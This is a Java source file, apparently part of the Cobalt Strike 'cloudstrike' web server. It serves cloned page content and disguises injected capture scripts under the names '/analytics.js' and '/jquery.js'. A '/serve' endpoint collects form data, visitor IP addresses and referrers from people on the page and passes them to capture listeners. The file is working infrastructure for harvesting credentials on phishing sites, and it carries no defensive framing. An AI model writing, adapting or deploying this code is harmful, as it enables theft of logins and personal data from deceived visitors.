package cloudstrike;

import profiler.SystemProfiler;

import java.util.*;

public class CaptureContent implements WebService {
    protected String content;
    protected String type;
    protected String desc;
    protected String proto = "";
    protected List listeners = new LinkedList();

    public void addCaptureListener(CaptureListener l) {
        this.listeners.add(l);
    }

    public CaptureContent(String content, String type, String desc) {
        this.content = content;
        this.type = type;
        this.desc = desc;
    }

    @Override
    public void setup(WebServer w, String uri) {
        w.register(uri, this);
        w.registerSecondary("/analytics.js", this);
        w.registerSecondary("/serve", this);
        w.registerSecondary("/jquery.js", this);
        this.proto = w.isSSL() ? "https://" : "http://";
    }

    public String resource(String resource, String url) {
        StringBuilder temp = new StringBuilder(524288);
        try {
            SystemProfiler.suckItDown(resource, temp);
        } catch (Exception ex) {
            WebServer.logException("Could not get " + resource, ex, false);
        }
        return temp.toString().replace("%URL%", url);
    }

    @Override
    public Response serve(String uri, String method, Properties header, Properties param) {
        if (uri.equals("/analytics.js")) {
            return new Response("200 OK", "text/javascript", this.resource("/resources/analytics.js", this.proto + header.get("Host")));
        }
        if (uri.equals("/jquery.js")) {
            return new Response("200 OK", "text/javascript", this.resource("/resources/jquery-1.7.1.min.js", this.proto + header.get("Host")));
        }
        if (uri.equals("/serve")) {
            Iterator i = this.listeners.iterator();
            String who = header.get("REMOTE_ADDRESS") + "";
            String from = header.get("Referer") + "";
            if (who.length() > 1) {
                who = who.substring(1);
            }
            CaptureListener l = null;
            while (i.hasNext()) {
                try {
                    l = (CaptureListener) i.next();
                    l.capturedForm(from, who, param, param.get("id") + "");
                } catch (Exception ex) {
                    WebServer.logException("Listener: " + l + " vs. " + from + ", " + who + ", " + param, ex, false);
                }
            }
            return new Response("200 OK", "text/plain", "");
        }
        return new Response("200 OK", this.type, this.content);
    }

    public String toString() {
        return this.desc;
    }

    @Override
    public String getType() {
        return "page";
    }

    @Override
    public List cleanupJobs() {
        return new LinkedList();
    }

    @Override
    public boolean suppressEvent(String uri) {
        return false;
    }

    @Override
    public boolean isFuzzy() {
        return false;
    }

    public interface CaptureListener {
        void capturedForm(String var1, String var2, Map var3, String var4);
    }

}

